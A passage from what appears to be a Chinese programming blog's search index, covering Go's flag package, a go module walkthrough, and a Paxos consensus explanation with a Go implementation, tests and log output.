*，如果有一个文件名字是：0或false等，则命令的原意会改变（之所以这样，是因为 bool 类型支持 -flag 这种形式，如果 bool 类型不支持 -flag 这种形式，则 bool 类型可以和其他类型一样处理。也正因为这样，Parse()中，对 bool 类型进行了特殊处理）。默认的，提供了 -flag，则对应的值为 true，否则为 flag.Bool/BoolVar 中指定的默认值；如果希望显示设置为 false 则使用 -flag=false。\nint 类型可以是十进制、十六进制、八进制甚至是负数；bool 类型可以是1, 0, t, f, true, false, TRUE, FALSE, True, False。Duration 可以接受任何time.ParseDuration能解析的类型。\n如果想要更复杂的flag实现pflag或者cobra\n","permalink":"https://www.fenghong.tech/blog/go/go-flag/","tags":["go","flag"],"title":"go flag"},{"categories":["golang"],"contents":"[TOC]\nuse go module easy 演示一个简单的函数,要安装一个日志依赖github.com/Sirupsen/logrus. 借以演示go mod的用法, 请轻喷~\n$ cat main.go /* @Time : 2019/9/8 1:35 @Author : louis @File : main @Software: GoLand */ package main import log \u0026quot;github.com/Sirupsen/logrus\u0026quot; func main() { log.Info(\u0026quot;this is a log log\u0026quot;) log.Warn(\u0026quot;this is an another log log\u0026quot;) log.Fatal(\u0026quot;this a bad log\u0026quot;) } 如果没有modules,安装依赖需要一个一个go get ...\ngo run main.go $ go run main.go te.go:3:9: cannot find package \u0026quot;github.com/Sirupsen/logrus\u0026quot; in any of: c:\\go\\src\\github.com\\Sirupsen\\logrus (from $GOROOT) D:\\Souce_Code\\fenghong\\go\\src\\github.com\\Sirupsen\\logrus (from $GOPATH) 使用细节 当我们使用go mod的时候,只需要init一下就好,但是必须在$GOAPTH下面,而且GO111MODULES=on.\n1.不在$GOPATH下,报这个错. $ go mod init go: cannot determine module path for source directory D:\\Souce_Code\\fenghong\\wiki\\content\\go (outside GOPATH, module path must be specified) Example usage: 'go mod init example.com/m' to initialize a v0 or v1 module 'go mod init example.com/m/v2' to initialize a v2 module Run 'go help mod init' for more information. 2.生成go.mod文件 $ cd $GOPATH/yourproject \u0026amp;\u0026amp; go mod init 3.查看mod文件 $ cat go.mod module gogs.wangke.co/go/algo/gomod go 1.13 4.运行程序 这里报错了,是因为导入的包是大写的,但是项目里面go.mod里面是小写的.更改之后就好了\n$ go run main.go go: github.com/Sirupsen/logrus: github.com/Sirupsen/logrus@v1.4.2: parsing go.mod: module declares its path as: github.com/sirupsen/logrus but was required as: github.com/Sirupsen/logrus $ go run main.go time=\u0026quot;2019-09-08T02:16:46+08:00\u0026quot; level=info msg=\u0026quot;this is a log log\u0026quot; time=\u0026quot;2019-09-08T02:16:46+08:00\u0026quot; level=warning msg=\u0026quot;this is an another log log\u0026quot; time=\u0026quot;2019-09-08T02:16:46+08:00\u0026quot; level=fatal msg=\u0026quot;this a bad log\u0026quot; exit status 1 ## 4.1 下载完之后,当前目录会生成一个go.sum文件 $ cat go.sum github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3+rkHYY13jYWTU97c= github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI+c5H38= github.com/konsorten/go-windows-terminal-sequences v1.0.1 h1:mweAR1A6xJ3oS2pRaGiHgQ4OO8tzTaLawm8vnODuwDk= github.com/konsorten/go-windows-terminal-sequences v1.0.1/go.mod h1:T0+1ngSBFLxvqU3pZ+m/2kptfBszLMUkC4ZK/EgS/cQ= github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM= github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4= github.com/sirupsen/logrus v1.4.2 h1:SPIRibHv4MatM3XXNO2BJeFLZwZ2LvZgfQ5+UNI2im4= github.com/sirupsen/logrus v1.4.2/go.mod h1:tLMulIdttU9McNUspp0xgXVQah82FyeX6MwdIuYE2rE= github.com/stretchr/objx v0.1.1/go.mod h1:HFkY916IF+rwdDfMAkV7OtwuqBVzrE8GR6GFx+wExME= github.com/stretchr/testify v1.2.2 h1:bSDNvY7ZPG5RlJ8otE/7V6gMiyenm9RtJ7IUVIAoJ1w= github.com/stretchr/testify v1.2.2/go.mod h1:a8OnRcib4nhh0OaRAV+Yts87kKdq0PP7pXfy6kDkUVs= golang.org/x/sys v0.0.0-20190422165155-953cdadca894 h1:Cz4ceDQGXuKRnVBDTS23GTn/pU5OE2C0WrNTOYK1Uuc= golang.org/x/sys v0.0.0-20190422165155-953cdadca894/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs= 5.mod tidy 运行go mod tidy可以自行安装依赖,这里推荐使用GOPROXY=https://gorpoxy.cn 设置好代理,直接下载被抢的依赖.在也不用担心golang.org背墙了.\n$ go mod tidy go: downloading golang.org/x/sys v0.0.0-20190422165155-953cdadca894 go: downloading github.com/stretchr/testify v1.2.2 go: extracting github.com/stretchr/testify v1.2.2 go: extracting golang.org/x/sys v0.0.0-20190422165155-953cdadca894 6. mod vendor 使用go mod vendor会使自己的依赖全部复制至vendor包里面 vendor依赖这边就不说了,go寻找依赖包先找vendor,再找$GOPATH再找GOROOT.\n$ go mod vendor $ ls go.mod go.sum main.go readme.md vendor/ 当我们想知道go.sum里面为什么会有这个依赖的时候,就可以利用why这个flag来进行查询了\n$ go mod why github.com/davecgh/go-spew # github.com/davecgh/go-spew (main module does not need package github.com/davecgh/go-spew) $ go mod why -m github.com/davecgh/go-spew # github.com/davecgh/go-spew gogs.wangke.co/go/algo/gomod github.com/sirupsen/logrus github.com/sirupsen/logrus.test github.com/stretchr/testify/assert github.com/davecgh/go-spew/spew 简单的用法就说到这里~\n","permalink":"https://www.fenghong.tech/blog/go/go-mod/","tags":["module"],"title":"go module"},{"categories":["algorithm","golang"],"contents":"[TOC]\nPaxos 问题描述和假设 分布式系统中的节点通信存在两种模型：共享内存（Shared memory）和消息传递（Messages passing）。基于消息传递通信模型的分布式系统，不可避免的会发生以下错误：进程可能会慢、被杀死或者重启，消息可能会延迟、丢失、重复，在基础 Paxos 场景中，先不考虑可能出现消息篡改即拜占庭错误的情况。Paxos 算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个“一致性算法”以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。因此从20世纪80年代起对于一致性算法的研究就没有停止过。\n为描述Paxos算法，Lamport虚拟了一个叫做Paxos的希腊城邦，这个岛按照议会民主制的政治模式制订法律，但是没有人愿意将自己的全部时间和精力放在这种事情上。所以无论是议员，议长或者传递纸条的服务员都不能承诺别人需要时一定会出现，也无法承诺批准决议或者传递消息的时间。但是这里假设没有拜占庭将军问题（Byzantine failure，即虽然有可能一个消息被传递了两次，但是绝对不会出现错误的消息）；只要等待足够的时间，消息就会被传到。另外，Paxos岛上的议员是不会反对其他议员提出的决议的。\n对应于分布式系统，议员对应于各个节点，制定的法律对应于系统的状态。各个节点需要进入一个一致的状态，例如在独立Cache的对称多处理器系统中，各个处理器读内存的某个字节时，必须读到同样的一个值，否则系统就违背了一致性的要求。一致性要求对应于法律条文只能有一个版本。议员和服务员的不确定性对应于节点和消息传递通道的不可靠性\n算法的提出与证明 首先将议员的角色分为 proposers，acceptors，和 learners（允许身兼数职）。proposers 提出提案，提案信息包括提案编号和提议的 value；acceptor 收到提案后可以接受（accept）提案，若提案获得多数派（majority）的 acceptors 的接受，则称该提案被批准（chosen）；learners 只能“学习”被批准的提案。划分角色后，就可以更精确的定义问题：\n 决议（value）只有在被 proposers 提出后才能被批准（未经批准的决议称为“提案（proposal）”）； 在一次 Paxos 算法的执行实例中，只批准（chosen）一个 value； learners 只能获得被批准（chosen）的 value。  在 Leslie Lamport 之后发表的paper中将 majority 替换为更通用的 quorum 概念，但在描述classic paxos的论文 Paxos made simple 中使用的还是majority的概念。 另外还需要保证 progress。这一点以后再讨论。\n作者通过不断加强上述3个约束（主要是第二个）获得了 Paxos 算法。\n批准 value 的过程中，首先 proposers 将 value 发送给 acceptors，之后 acceptors 对 value 进行接受（accept）。为了满足只批准一个 value 的约束，要求经“多数派（majority）”接受的 value 成为正式的决议（称为“批准”决议）。这是因为无论是按照人数还是按照权重划分，两组“多数派”至少有一个公共的 acceptor，如果每个 acceptor 只能接受一个 value，约束2就能保证。\n于是产生了一个显而易见的新约束：\nP1：一个 acceptor 必须接受（accept）第一次收到的提案。 注意 P1 是不完备的。如果恰好一半 acceptor 接受的提案具有 value A，另一半接受的提案具有 value B，那么就无法形成多数派，无法批准任何一个 value。\n约束2并不要求只批准一个提案，暗示可能存在多个提案。只要提案的 value 是一样的，批准多个提案不违背约束2。于是可以产生约束 P2：\nP2：一旦一个具有 value v 的提案被批准（chosen），那么之后批准（chosen）的提案必须具有 value v。 注：通过某种方法可以为每个提案分配一个编号，在提案之间建立一个全序关系，所谓“之后”都是指所有编号更大的提案。\n如果 P1 和 P2 都能够保证，那么约束2就能够保证。\n批准一个 value 意味着多个 acceptor 接受（accept）了该 value。因此，可以对 P2 进行加强：\nP2a：一旦一个具有 value v 的提案被批准（chosen），那么之后任何 acceptor 再次接受（accept）的提案必须具有 value v。 由于通信是异步的，P2a 和 P1 会发生冲突。如果一个 value 被批准后，一个 proposer 和一个 acceptor 从休眠中苏醒，前者提出一个具有新的 value 的提案。根据 P1，后者应当接受，根据 P2a，则不应当接受，这种场景下 P2a 和 P1 有矛盾。于是需要换个思路，转而对 proposer 的行为进行约束：\nP2b：一旦一个具有 value v 的提案被批准（chosen），那么以后任何 proposer 提出的提案必须具有 value v。 由于 acceptor 能接受的提案都必须由 proposer 提出，所以 P2b 蕴涵了 P2a，是一个更强的约束。\n但是根据 P2b 难以提出实现手段。因此需要进一步加强 P2b。\n假设一个编号为 m 的 value v 已经获得批准（chosen），来看看在什么情况下对任何编号为 n（n\u0026gt;m）的提案都含有 value v。因为 m 已经获得批准（chosen），显然存在一个 acceptors 的多数派 C，他们都接受（accept）了v。考虑到任何多数派都和 C 具有至少一个公共成员，可以找到一个蕴涵 P2b 的约束 P2c：\nP2c：如果一个编号为 n 的提案具有 value v，那么存在一个多数派，要么他们中所有人都没有接受（accept）编号小于 n 的任何提案，要么他们已经接受（accept）的所有编号小于 n 的提案中编号最大的那个提案具有 value v。 可以用数学归纳法证明 P2c 蕴涵 P2b：\n假设具有value v的提案m获得批准，当n=m+1时，采用反证法，假如提案n不具有value v，而是具有value w，根据P2c，则存在一个多数派S1，要么他们中没有人接受过编号小于n的任何提案，要么他们已经接受的所有编号小于n的提案中编号最大的那个提案是value w。由于S1和通过提案m时的多数派C之间至少有一个公共的acceptor，所以以上两个条件都不成立，导出矛盾从而推翻假设，证明了提案n必须具有value v；\n若（m+1）..（N-1）所有提案都具有value v，采用反证法，假如新提案N不具有value v，而是具有value w\u0026rsquo;,根据P2c，则存在一个多数派S2，要么他们没有接受过m..（N-1）中的任何提案，要么他们已经接受的所有编号小于N的提案中编号最大的那个提案是value w\u0026rsquo;。由于S2和通过m的多数派C之间至少有一个公共的acceptor，所以至少有一个acceptor曾经接受了m，从而也可以推出S2中已接受的所有编号小于n的提案中编号最大的那个提案的编号范围在m..（N-1）之间，而根据初始假设，m..（N-1）之间的所有提案都具有value v，所以S2中已接受的所有编号小于n的提案中编号最大的那个提案肯定具有value v，导出矛盾从而推翻新提案n不具有value v的假设。根据数学归纳法，我们证明了若满足P2c，则P2b一定满足。\nP2c是可以通过消息传递模型实现的。另外，引入了P2c后，也解决了前文提到的P1不完备的问题。\ngolang实现 实现的步骤 //a. Proposer选择一个提案编号N，然后向半数以上的Acceptor发送编号为N的Prepare请求。 //a.1 生成编号N的算法为 `p.lastSeq \u0026lt;\u0026lt;16 | p.id` //b. acceptor返回promise,并保证小于n的提案不在接收 //c.1 更新proposer里面的acceptor,保证proposer存入的acceptor提案N为最新 //c.2 acceptor里返回的promise达到半数以上 //c.3 如果Proposer收到半数以上Acceptor对其发出的编号为N的Prepare请求的响应， // 那么它就会发送一个针对[N,V]提案的Accept请求给半数以上的Acceptor // d. 接收proposer的提案N,如果已接收提案N\u0026gt;返回的propose的提案N,则忽略 // 如果已接收提案N\u0026lt; 返回的propose提案N,说明错误;违反了P2c原则 // 如果相同,则接收提案N,将propose提案存入accept里面,并将accept.typ改为接受. //e. 将accept信息发送至learner,通知learner我接受提案N //f. learner等待acceptor发送accept mes //f.1 如果消息类型不为Accept, 返回错误 //f.2 从accepted消息中来进行比对,如果接收的提案N \u0026gt; learner存入的提案N,需要重新学习;否则就忽略 //g. 如果半数以上的learner选择了提案N,则说明选择完毕 代码 /* @Time : 2019/8/27 18:39 @Author : louis @File : paxos @Software: GoLand */ package paxos import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;time\u0026#34; ) const ( //Prepare 准备发送的消息 \tPrepare = iota + 1 //Propose 待批准的消息-提案消息,并保证小于n的提案不在接收 \tPropose //Promise accept返回的消息 \tPromise //Accept 已经接收的提案 \tAccept ) //promise 接口只能获取消息的提案号 type promise interface { number() int } type accept interface { //accept接口获取提案的值 \tproposalValue() string //accept接口获取提案的号 \tproposalNumber() int } //mes 消息体 type mes struct { from, to int //消息发送\\接收 \ttyp int //消息类型 \tn int //提案号 \tpren int //前一个提案号 \tvalue string //提案值value } //proposalValue 只有是accept和promise类型的消息,才具备提案value值 func (m mes) proposalValue() string { //返回value需要什么条件呢？ \tswitch m.typ { case Accept, Promise: return m.value default: panic(\u0026#34;unexpect proposalValue\u0026#34;) } } func (m mes) proposalNumber() int { switch m.typ { case Promise: return m.pren case Accept: return m.n default: panic(\u0026#34;unexpect proposalNumber\u0026#34;) } } func (m mes) number() int { return m.n } //network to send and recv mes type network interface { send(m mes) recv(timeout time.Duration) (mes, bool) } // paxosNet paxos 的消息管道,recv[i]消息的接收i接收的信息 type paxosNet struct { recv map[int]chan mes } // newPaxNet 生成paxosNet,根据agent的数量生成 func newPaxNet(agents ...int) *paxosNet { pn := \u0026amp;paxosNet{recv: make(map[int]chan mes, 0)} for _, a := range agents { pn.recv[a] = make(chan mes, 1024) } return pn } //send 发送消息mes至pn中的接收者i func (pn *paxosNet) send(m mes) { log.Printf(\u0026#34;nt send message :%+v\u0026#34;, m) pn.recv[m.to] \u0026lt;- m } //rec 从agent接收mes,并输出,返回信息mes和bool. func (pn *paxosNet) rec(from int, timeout time.Duration) (mes, bool) { select { case m := \u0026lt;-pn.recv[from]: log.Printf(\u0026#34;nt recv message :%+v\u0026#34;, m) return m, true case \u0026lt;-time.After(timeout): return mes{}, false } } //agentNet 根据agent的id生成AgentNet结构体 func (pn *paxosNet) agentNet(id int) *agentNet { return \u0026amp;agentNet{id: id, pn: pn} } //Empty 判断pn是不是空 func (pn *paxosNet) empty() bool { var n int for i, q := range pn.recv { log.Printf(\u0026#34;nt %+v left %d\u0026#34;, i, len(q)) n += len(q) } return n == 0 } //AgentNet 代理网络结构体,存放代理的id号和pn消息网络结构体 type agentNet struct { id int pn *paxosNet } func (an *agentNet) send(m mes) { an.pn.send(m) } func (an *agentNet) recv(timeout time.Duration) (mes, bool) { return an.pn.rec(an.id, timeout) } //proposer 提案提出者 type proposer struct { id int //提案号 \tlastSeq int //上一条Seq消息好 \tvalue string //提案的value \tvalueN int acceptors map[int]promise //接受者的消息map \tnt network //paxos的网络 } //newPropose 生成新的提案提出者proposer func newPropose(id int, value string, nt network, acceptors ...int) *proposer { p := \u0026amp;proposer{ id: id, lastSeq: 0, nt: nt, value: value, acceptors: make(map[int]promise), } for _, a := range acceptors { //遍历acceptors,生成proposer \tp.acceptors[a] = mes{} } return p } func (p *proposer) run() { var ok bool var m mes //c.2 acceptor里返回的promise达到半数以上 \tfor !p.quorumCheck() { if !ok { //a. Proposer准备prepare,生成提案编号N，然后向半数以上的Acceptor发送编号为N的Prepare请求。 \tms := p.prepare() for i := range ms { p.nt.send(ms[i]) } } m, ok = p.nt.recv(time.Second) // 返回数据失败,说明此次的prepare失败,重新prepare \tif !ok { continue } // prepare成功 \tswitch m.typ { case Promise: //c.1 更新proposer里面的acceptor,保证proposer存入的acceptor提案N为最新 \tp.receivePromise(m) default: log.Panicf(\u0026#34;proposer: %d unexpected message type: %v\u0026#34;, p.id, m.typ) } } log.Printf(\u0026#34;%d promise %d reached quorum %d\u0026#34;, p.id, p.n(), p.quorum()) //c.3 如果Proposer收到半数以上Acceptor对其发出的编号为N的Prepare请求的响应， \t// 那么它就会发送一个针对[N,V]提案的Accept请求给半数以上的Acceptor \tms := p.propose() for i := range ms { fmt.Printf(\u0026#34;proposer %d: \u0026#34;, p.id) p.nt.send(ms[i]) } } //大多数,半数+1即为大多数 func (p *proposer) quorum() int { return len(p.acceptors)/2 + 1 } //c.2 acceptor返回的promise大于半数以上同意 func (p *proposer) quorumCheck() bool { m := 0 for _, promise := range p.acceptors { // promise里面的提案N 必须和 proposer的提案N相同. \tif promise.number() == p.n() { m++ } } if m \u0026gt;= p.quorum() { return true } return false } //在一个paxos实例中，每个提案需要有不同的编号，且编号间要存在全序关系 func (p *proposer) n() int { // 把\u0026#34;\u0026lt;\u0026lt;\u0026#34;左边的运算数的各二进位全部左移若干位，由\u0026#34;\u0026lt;\u0026lt;\u0026#34;右边的数指定移动的位数，高位丢弃，低位补0 \t// 再把结果和p.id 进行或运算,将1位合并置1 \treturn p.lastSeq\u0026lt;\u0026lt;16 | p.id } //c.3 如果Proposer收到半数以上Acceptor对其发出的编号为N的Prepare请求的响应，把proposer的value携带上. // 那么它就会发送一个针对[N,V]提案的Accept请求给半数以上的Acceptor func (p *proposer) propose() []mes { m := make([]mes, p.quorum()) i := 0 // 取acceptors里面的index,promise,只能取promise里面的mes.n \tfor to, promise := range p.acceptors { //如果acceptors的n,和proposer的提案n相等,即acceptor接收proposer的提案n. \tif promise.number() == p.n() { m[i] = mes{ from: p.id, to: to, typ: Propose, n: p.n(), value: p.value, } i++ } if i == p.quorum() { break } } return m } //a. Proposer选择一个提案编号N，然后向半数以上的Acceptor发送编号为N的Prepare请求。 func (p *proposer) prepare() []mes { p.lastSeq++ m := make([]mes, p.quorum()) i := 0 // 只取acceptors里面的index,即acceptors \tfor to := range p.acceptors { m[i] = mes{ from: p.id, to: to, typ: Prepare, n: p.n(), } i++ if i == p.quorum() { break } } return m } //c.1 更新proposer里面的acceptor,保证proposer存入的acceptor提案N为最新 // 从acceptor接收的promise消息. func (p *proposer) receivePromise(promise mes) { prePromise := p.acceptors[promise.from] // 从acceptor接收的promise和propose里面的number进行比对 \t// propose.acceptors[promise.from].number() \u0026lt; promise.number() \t// 返回的promise大,则更新proposer里面的promise为最新版. \tif prePromise.number() \u0026lt; promise.number() { log.Printf(\u0026#34;proposer: %d received a new promise %+v\u0026#34;, p.id, promise) p.acceptors[promise.from] = promise //acceptors返回的提案preN \u0026gt; proposer的N \tif promise.proposalNumber() \u0026gt; p.valueN { log.Printf(\u0026#34;proposer: %d updated the value [%s] to %s\u0026#34;, p.id, p.value, promise.proposalValue()) //promise.pren = p.n() \tp.valueN = promise.proposalNumber() p.value = promise.proposalValue() } } } type acceptor struct { id int //一旦acceptor接收提案propose; \t// 便需要通知所有learners,通信总次数为 M * N \t//TODO 通知learner集合,再由learner集合通知剩下的learner \tlearners []int accept mes promised promise nt network } func newAcceptor(id int, nt network, learners ...int) *acceptor { return \u0026amp;acceptor{ id: id, nt: nt, promised: mes{}, learners: learners, } } func (a *acceptor) run() { for { m, ok := a.nt.recv(time.Hour) if !ok { continue } switch m.typ { case Propose: //d. 接收proposer的提案N,如果已接收提案N\u0026gt;返回的propose的提案N,则忽略 \t// 如果已接收提案N\u0026lt; 返回的propose提案N,说明错误;违反了P2c原则 \t// 如果相同,则接收提案N,将propose提案存入accept里面,并将accept.typ改为接受. \taccepted := a.receivePropose(m) if accepted { //e. 将accept信息发送至learner,通知learner我接受提案N \tfor _, l := range a.learners { m = a.accept m.from = a.id m.to = l a.nt.send(m) } } //b. acceptor返回promise,并保证小于n的提案不在接收 \tcase Prepare: promised, ok := a.receivePrepare(m) if ok { a.nt.send(promised) } default: log.Panicf(\u0026#34;accepted : %d message tpye unknwon: %d\u0026#34;, a.id, m.typ) } } } // d. 接收proposer的提案N,如果已接收提案N\u0026gt;返回的propose的提案N,则忽略 // 如果已接收提案N\u0026lt; 返回的propose提案N,说明错误;违反了P2c原则 // 如果相同,则接收提案N,将propose提案存入accept里面,并将accept.typ改为接受. //P2c：如果一个编号为 n 的提案具有 value v，那么存在一个多数派，要么他们中所有人都没有接受（accept）编号小于 n //的任何提案，要么他们已经接受（accept）的所有编号小于 n 的提案中编号最大的那个提案具有 value v。 func (a *acceptor) receivePropose(propose mes) bool { // 已接收提案N \u0026gt; propose的mes.n;不接收这个提案 \tif a.promised.number() \u0026gt; propose.number() { log.Printf(\u0026#34;acceptor %d [promised: %+v] ignored propose mes: %+v\u0026#34;, a.id, a.promised, propose) return false } //已接收提案N \u0026lt; propose的mes.n; \tif a.promised.number() \u0026lt; propose.number() { log.Panicf(\u0026#34;acceptor %d [promised: %+v] received unexpected proposal mes: %+v\u0026#34;, a.id, a.promised, propose) } log.Printf(\u0026#34;acceptor %d [promised: %+v, accept: %+v] accepted propose: %+v\u0026#34;, a.id, a.promised, a.accept, propose) a.accept = propose a.accept.typ = Accept return true } //b. acceptor返回promise,并保证小于n的提案不在接收 func (a *acceptor) receivePrepare(prepare mes) (promised mes, b bool) { // 如果获取的m.n大于提案N,Promised提案接收,承诺不再接收任何小于N的提案 \t// P1:一个 acceptor 必须接受（accept）第一次收到的提案。 \tif a.promised.number() \u0026lt; prepare.number() { log.Printf(\u0026#34;acceptor %d [promised: %+v] promised %+v\u0026#34;, a.id, a.promised, prepare) a.promised = prepare //把消息返回 \tpromised = mes{ typ: Promise, from: a.id, to: prepare.from, n: a.promised.number(), pren: a.accept.n, value: a.accept.value, } return promised, true } log.Printf(\u0026#34;acceptor %d [promised: %+v] ignored prepare mes: %+v\u0026#34;, a.id, a.promised, prepare) return mes{}, false } type learner struct { id int acceptors map[int]accept nt network value chan string //测试数据比对,learner学习后得到的提案N对应的V[N,V] } func newLearner(id int, nt network, acceptors ...int) *learner { l := \u0026amp;learner{id: id, nt: nt, acceptors: make(map[int]accept), value: make(chan string)} for _, a := range acceptors { l.acceptors[a] = mes{typ: Accept} } return l } func (l *learner) GetValue() (v string) { select { case v := \u0026lt;-l.value: return v case \u0026lt;-time.After(time.Second): return } } func (l *learner) learn() { for { //f. 等待acceptor发送accept mes, \tm, ok := l.nt.recv(time.Hour) if !ok { continue } //f.1 如果消息类型不为Accept, 返回错误 \tif m.typ != Accept { log.Panicf(\u0026#34;learner :%d receive an unexpected proposal mes: %+v\u0026#34;, l.id, m) } //f.2 从accepted消息中来进行比对,如果接收的提案N \u0026gt; learner存入的提案N,需要重新学习;否则就忽略 \tl.receiveAccept(m) //g. 如果半数以上的learner选择了提案N,则说明选择完毕 \taccept, ok := l.chosen() if !ok { continue } log.Printf(\u0026#34;learner :%d has chosen proposal : %v \u0026#34;, l.id, accept) l.value \u0026lt;- accept.proposalValue() return } } //g. 如果半数的learner选择了提案N,则说明选择完毕 func (l *learner) chosen() (accept, bool) { counts := make(map[int]int) accepts := make(map[int]accept) for _, accepted := range l.acceptors { // 统计learner接收提案的次数;为0说明没有接收过提案 \tif accepted.proposalNumber() != 0 { counts[accepted.proposalNumber()]++ accepts[accepted.proposalNumber()] = accepted } } for n, count := range counts { // quorum达到即返回 \tif count \u0026gt;= l.quorum() { return accepts[n], true } } return mes{}, false } func (l *learner) quorum() int { return len(l.acceptors)/2 + 1 } //f.2 从accepted消息中来进行比对,如果接收的提案N \u0026gt; learner存入的提案N,需要重新学习;否则就忽略 func (l *learner) receiveAccept(accepted mes) { a := l.acceptors[accepted.from] // 提案N \u0026lt; 接收的 N; 需要接收大于N的提案 \tif a.proposalNumber() \u0026lt; accepted.n { log.Printf(\u0026#34;learner %d has learned a new proposal mes: %+v\u0026#34;, l.id, accepted) l.acceptors[accepted.from] = accepted } } 看着大佬的代码理解了一遍;测试函数如下\n/* @Time : 2019/8/27 22:17 @Author : Administrator @File : test_paxos @Software: GoLand */ package paxos import ( \u0026#34;fmt\u0026#34; \u0026#34;testing\u0026#34; \u0026#34;time\u0026#34; ) type node struct { key int next *node } func TestN(t *testing.T) { first := \u0026amp;node{} cur := \u0026amp;node{} lastSeq := 1 id := 0 // 保证生成的数不相同 \t// 生成编号 N 的提案 测试了1亿级别的数据,耗时15.53s \t// --- PASS: TestN (15.53s) \tconst num = 10000000 for id = 0; id \u0026lt;= num; id++ { n := \u0026amp;node{key: lastSeq\u0026lt;\u0026lt;16 | id} if id == 0 { first = n cur = n } else { cur.next = n if cur.key == cur.next.key { t.Errorf(\u0026#34;有重复元素: %+v\u0026#34;, cur.key) } cur = n lastSeq++ } } t.Log(first) } func TestSingleProposer(t *testing.T) { // 1,2,3,4,5 acceptors \t// 1001 proposer \t// 2001 learner \tpn := newPaxNet(1, 2, 3, 4, 5, 1001, 2001) ac := make([]*acceptor, 0) for i := 1; i \u0026lt;= 5; i++ { ac = append(ac, newAcceptor(i, pn.agentNet(i), 2001)) } for _, a := range ac { go a.run() } wantValue := \u0026#34;hello world\u0026#34; p := newPropose(1001, wantValue, pn.agentNet(1001), 1, 2, 3, 4, 5) go p.run() l := newLearner(2001, pn.agentNet(2001), 1, 2, 3, 4, 5) go l.learn() v := l.GetValue() if v != wantValue { t.Errorf(\u0026#34;value = %s wanted value = %s\u0026#34;, v, wantValue) } } func TestTwoPropose(t *testing.T) { // 1,2,3 acceptors \t// 1001,1002 proposer \t// 2001 learner \tpn := newPaxNet(1, 2, 3, 1001, 1002, 2001) ac := make([]*acceptor, 0) for i := 1; i \u0026lt;= 3; i++ { ac = append(ac, newAcceptor(i, pn.agentNet(i), 2001)) } for _, a := range ac { go a.run() } wantV1 := \u0026#34;hello world\u0026#34; p1 := newPropose(1001, wantV1, pn.agentNet(1001), 1, 2, 3) go p1.run() wantV2 := \u0026#34;hello world v2\u0026#34; // 提出提案N 此时lastSeq++; \tp2 := newPropose(1002, wantV2, pn.agentNet(1002), 1, 2, 3) go p2.run() l := newLearner(2001, pn.agentNet(2001), 1, 2, 3) go l.learn() va := l.GetValue() if va != wantV2 { t.Errorf(\u0026#34;value = %s,wantValue = %s\u0026#34;, va, wantV2) } } func TestNPropose(t *testing.T) { pn := newPaxNet(1, 2, 3, 1001, 1002, 1003, 2001, 2002) ac := make([]*acceptor, 0) for i := 1; i \u0026lt;= 3; i++ { ac = append(ac, newAcceptor(i, pn.agentNet(i), 2001, 2002)) } for _, a := range ac { go a.run() } pp := make([]*proposer, 0) for i := 1001; i \u0026lt;= 1003; i++ { wantStr := \u0026#34;hello world v\u0026#34; + fmt.Sprint(i) pp = append(pp, newPropose(i, wantStr, pn.agentNet(i), 1, 2, 3)) } for _, p := range pp { go p.run() } //这里模拟两个learner \tln := make([]*learner, 0) for i := 2001; i \u0026lt;= 2002; i++ { ln = append(ln, newLearner(i, pn.agentNet(i), 1, 2, 3)) } var v [2]string for k, l := range ln { go l.learn() v[k] = l.GetValue() } if v[0] != v[1] { t.Errorf(\u0026#34;value = %s,wantValue = %s\u0026#34;, v[0], v[1]) } time.Sleep(500 * time.Millisecond) } 验证结果: === RUN TestNPropose 2019/08/28 18:58:29 nt send message :{from:1001 to:1 typ:1 n:66537 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:1001 to:2 typ:1 n:66537 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:1001 to:1 typ:1 n:66537 pren:0 value:} 2019/08/28 18:58:29 acceptor 1 [promised: {from:0 to:0 typ:0 n:0 pren:0 value:}] promised {from:1001 to:1 typ:1 n:66537 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:1 to:1001 typ:3 n:66537 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:1001 to:2 typ:1 n:66537 pren:0 value:} 2019/08/28 18:58:29 acceptor 2 [promised: {from:0 to:0 typ:0 n:0 pren:0 value:}] promised {from:1001 to:2 typ:1 n:66537 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:2 to:1001 typ:3 n:66537 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:1002 to:3 typ:1 n:66538 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:1002 to:1 typ:1 n:66538 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:1002 to:1 typ:1 n:66538 pren:0 value:} 2019/08/28 18:58:29 acceptor 1 [promised: {from:1001 to:1 typ:1 n:66537 pren:0 value:}] promised {from:1002 to:1 typ:1 n:66538 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:1 to:1002 typ:3 n:66538 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:1 to:1002 typ:3 n:66538 pren:0 value:} 2019/08/28 18:58:29 proposer: 1002 received a new promise {from:1 to:1002 typ:3 n:66538 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:1003 to:1 typ:1 n:66539 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:1003 to:2 typ:1 n:66539 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:1003 to:2 typ:1 n:66539 pren:0 value:} 2019/08/28 18:58:29 acceptor 2 [promised: {from:1001 to:2 typ:1 n:66537 pren:0 value:}] promised {from:1003 to:2 typ:1 n:66539 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:2 to:1003 typ:3 n:66539 